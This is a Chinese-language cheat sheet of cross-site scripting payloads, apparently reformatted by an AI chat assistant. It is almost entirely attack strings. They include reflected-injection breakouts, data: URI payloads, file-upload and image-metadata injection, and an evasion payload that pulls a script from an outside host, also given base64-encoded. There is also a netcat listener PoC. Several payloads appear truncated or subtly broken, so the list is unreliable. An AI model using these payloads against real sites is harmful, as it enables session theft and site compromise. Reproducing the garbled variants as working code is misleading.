优化后的文本如下，以提高清晰度、连贯性和专业性：

---

### XSS攻击示例与防护

#### 反射型XSS
- **单输入反射**:
  ```javascript
  var n = {a: "$p", b: "$p"};
  ```
  输入：
  ```javascript
  p=-alert(1)}//\
  ```
  结果：
  ```javascript
  var n = {a: "-alert(1)}//\", b: "-alert(1)}//\"};
  ```

- **双输入反射**:
  ```javascript
  var n = {a: "$p", b: "$q"};
  ```
  输入：
  ```javascript
  p=\&q=-alert(1)//
  ```
  结果：
  ```javascript
  var n = {a: "\", b: "-alert(1)}//"};
  ```

#### 无事件处理器的XSS
- 使用`data:text/html,`和`data:text/html;base64,`进行XSS注入。
  - 例如：`data:text/html,<script>alert(1)</script>`
  - Base64编码形式：`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

- 属性注入示例（不使用事件处理器）：
  1. 无属性
  2. `src`
  3. `href`
  4. `action`
  5. `formaction`
  6. `data`
  7. `srcdoc`
  8. `xlink:href`
  9. `from`

#### 移动设备中的XSS
- 利用移动浏览器特性进行XSS攻击。
  - 例如：`open(c2.canvas.toDataURL())`

#### 文件上传中的XSS
- 文件名注入：
  - 例如：`">.gif`
- 元数据注入：
  - 例如：`$ exiftool -Artist='">' FILENAME.jpeg`
- 内容注入：
  - 例如：GIF文件中嵌入脚本：`GIF89a/**/=alert(document.domain)//;`

#### 避免XSS检测
- 使用`with`语句绕过某些XSS检测机制。
  - 例如：
    ```javascript
    with(document) body.appendChild(createElement('script')).src='//DOMAIN'
    ```

- 编码后的绕过方法：
  - 例如：
    ```javascript
    #d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWVhdGVFbGVtZW50KC9zY3JpcHQvLnNvdXJjZSkuc3JjPWF0b2IoL0x5OWljblYwWld4dloybGpMbU52YlM1aWNpOHkvLnNvdXJjZSk=
    ```

#### 最简PoC
- 示例：
  ```bash
  $ while:; do echo "alert(1)" | nc -lp80; done
  ```

- URL编码形式：
  - 例如：`Javas%26%2399;ript:alert(1)`
  - 在URL参数中使用：`http(s)://host/page?p=XSS`

#### 简短的XSS PoC
- 例如：
  ```html
  ">///"
  "<script>alert(1)</script>"
  "*//">/*alert(1)//"
  ```

通过以上示例和方法，可以更好地理解和防御XSS攻击。请确保在实际应用中采取适当的安全措施来防止这些漏洞。

---

希望这个版本更加清晰、连贯和专业。如果有任何进一步的需求或修改，请告诉我！